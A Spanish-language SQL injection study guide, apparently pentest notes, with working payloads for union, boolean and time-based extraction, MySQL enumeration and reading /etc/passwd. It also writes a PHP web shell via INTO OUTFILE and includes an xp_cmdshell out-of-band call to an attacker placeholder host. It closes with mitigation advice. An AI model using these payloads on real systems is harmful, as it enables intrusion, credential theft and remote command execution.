# SQL Injection (SQLi)

---

## ¿Qué es?

SQL Injection ocurre cuando la entrada del usuario se inserta directamente en una consulta SQL sin sanitizar. Esto permite al atacante modificar la lógica de la consulta para extraer datos, bypassear autenticación o incluso ejecutar comandos en el servidor.

**Ejemplo vulnerable en PHP:**

```php
$query = "SELECT * FROM logins WHERE username='" . $_POST['username'] . "' AND password='" . $_POST['password'] . "'";
```

Si el usuario introduce `admin'-- -` como nombre de usuario, la consulta resultante ignora la comprobación de contraseña.

---

## Tipos de SQLi

### In-Band (con salida visible)

**Union-Based** — Usa `UNION` para combinar el resultado de otra consulta con la original. Requiere que ambas consultas tengan el mismo número de columnas.

```sql
' UNION SELECT username, password FROM administradores-- -
```

**Error-Based** — Provoca errores intencionados que revelan información en el mensaje de error.

```sql
' AND CONVERT(int, 'texto')-- -
```

---

### Blind (sin salida visible)

La aplicación no muestra los datos directamente, pero su comportamiento permite inferirlos.

**Boolean-Based** — Se envían condiciones `TRUE/FALSE` y se observa si la página responde de forma diferente.

```sql
-- Si la página cambia, la condición es verdadera
' AND 1=1-- -
' AND 1=2-- -
```

Descubrir número de columnas:

```sql
' ORDER BY 1-- -   -- funciona
' ORDER BY 2-- -   -- funciona
' ORDER BY 3-- -   -- error → hay 2 columnas
```

Verificar si existe una tabla:

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='usuarios') > 0-- -
```

Extraer datos carácter a carácter:

```sql
-- Con strings
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'-- -

-- Con restricción de comillas (usando ASCII/HEX)
' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)=97-- -
```

**Time-Based** — Se usa `SLEEP()` para inferir información por el tiempo de respuesta del servidor.

```sql
-- Si tarda 5 segundos, la primera letra de la BD es 'a'
' AND IF(SUBSTR(database(),1,1)='a', SLEEP(5), 1)-- -

-- Sin comillas (usando ASCII)
' AND IF(ASCII(SUBSTR(database(),1,1))=97, SLEEP(5), 1)-- -
```

---

### Out-of-Band

Los datos se envían a un servidor externo controlado por el atacante. Menos común, útil cuando los otros métodos no son viables.

```sql
' ; EXEC xp_cmdshell('nslookup datos.atacante.com')-- -
```

---

## Detección de la vulnerabilidad

Probar estos payloads en campos de entrada o parámetros de URL. Si la aplicación responde con un error SQL o cambia de comportamiento, probablemente es vulnerable.

| Payload | URL Codificado |
|---------|----------------|
| `'`     | `%27`          |
| `"`     | `%22`          |
| `#`     | `%23`          |
| `;`     | `%3B`          |
| `)`     | `%29`          |

---

## Técnicas esenciales

### Comentarios SQL

Usados para ignorar el resto de la consulta original:

| Comentario | Notas |
|-----------|-------|
| `-- -`    | Doble guión + espacio. En URL: `--+` |
| `#`       | En URL: `%23` |
| `/* */`   | Comentario de bloque (raro) |

### Orden de operadores

`AND` tiene prioridad sobre `OR`. Útil para construir bypass de autenticación:

```sql
' OR '1'='1
```

### UNION: igualar número de columnas

Si la tabla original tiene 4 columnas y la nuestra 2, rellenar con datos basura:

```sql
' UNION SELECT username, password, 3, 4 FROM users-- -
```

> Tip: Usar `NULL` es más seguro para rellenar, ya que es compatible con cualquier tipo de dato.

Para identificar qué columnas se muestran en pantalla:

```sql
' UNION SELECT 1,2,3,4-- -
```

El número que aparezca en la respuesta es la posición que muestra datos.

---

## Enumeración de la base de datos (MySQL)

### Fingerprinting del DBMS

| Query | Cuándo usar | Resultado esperado |
|-------|-------------|-------------------|
| `SELECT @@version` | Con salida completa | Versión MySQL/MariaDB |
| `SELECT POW(1,1)` | Solo salida numérica | `1` |
| `SELECT SLEEP(5)` | Blind | Retraso de 5 segundos |

Ejemplo con UNION:

```sql
' UNION SELECT 1,@@version,user(),4-- -
```

### Listar bases de datos

```sql
' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -
```

Base de datos actual:

```sql
' UNION SELECT 1,database(),3,4-- -
```

### Listar tablas de una base de datos

```sql
' UNION SELECT 1,table_name,table_schema,4 FROM information_schema.tables WHERE table_schema='nombre_db'-- -
```

### Listar columnas de una tabla

```sql
' UNION SELECT 1,column_name,table_name,table_schema FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
```

### Extraer datos

```sql
' UNION SELECT 1,username,password,4 FROM nombre_db.nombre_tabla-- -
```

### Variables de referencia rápida (MySQL)

| Variable/Tabla | Descripción |
|---------------|-------------|
| `@@version` | Versión del DBMS |
| `user()` / `current_user()` | Usuario actual |
| `database()` | BD en uso |
| `INFORMATION_SCHEMA.SCHEMATA` | Lista de bases de datos |
| `INFORMATION_SCHEMA.TABLES` | Lista de tablas |
| `INFORMATION_SCHEMA.COLUMNS` | Lista de columnas |
| `INFORMATION_SCHEMA.USER_PRIVILEGES` | Privilegios del usuario |

---

## Lectura y escritura de archivos

### Prerrequisitos

1. El usuario de la BD debe tener el privilegio `FILE`.
2. La variable `secure_file_priv` debe estar vacía (o apuntar a un directorio accesible).
3. El usuario del SO que ejecuta MySQL debe tener permisos sobre el archivo.

### Comprobar privilegios

```sql
' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -

' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

### Comprobar secure_file_priv

```sql
' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

Si el valor está vacío → se puede leer/escribir libremente.

### Leer archivos con LOAD_FILE

```sql
' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4-- -

-- Leer código fuente de la aplicación
' UNION SELECT 1,LOAD_FILE("/var/www/html/index.php"),3,4-- -
```

> Si el código fuente tiene un `include`, buscar el archivo incluido para encontrar credenciales de la BD.

### Escribir archivos con INTO OUTFILE

Comprobar permisos de escritura:

```sql
' UNION SELECT 1,'test',3,4 INTO OUTFILE '/var/www/html/prueba.txt'-- -
```

Subir un web shell PHP:

```sql
' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Ejecutar comandos accediendo a: `http://target/shell.php?0=id`

> Para escribir archivos más complejos o binarios usar `FROM_BASE64("base64_data")`.

---

## Mitigación

### Consultas parametrizadas (la más efectiva)

```php
$query = "SELECT * FROM logins WHERE username=? AND password=?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
```

### Sanitización de entrada

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
```

### Validación por regex

```php
$pattern = "/^[A-Za-z\s]+$/";
if (!preg_match($pattern, $_GET['code'])) {
    die("Entrada no válida");
}
```

### Otras medidas

- Usar un usuario de BD con **mínimos privilegios** (solo `SELECT` sobre las tablas necesarias).
- Implementar un WAF (ej. ModSecurity, Cloudflare) para detectar payloads comunes.
- No mostrar mensajes de error SQL al usuario final.
- Nunca usar usuarios `root` o superadmin en aplicaciones web.
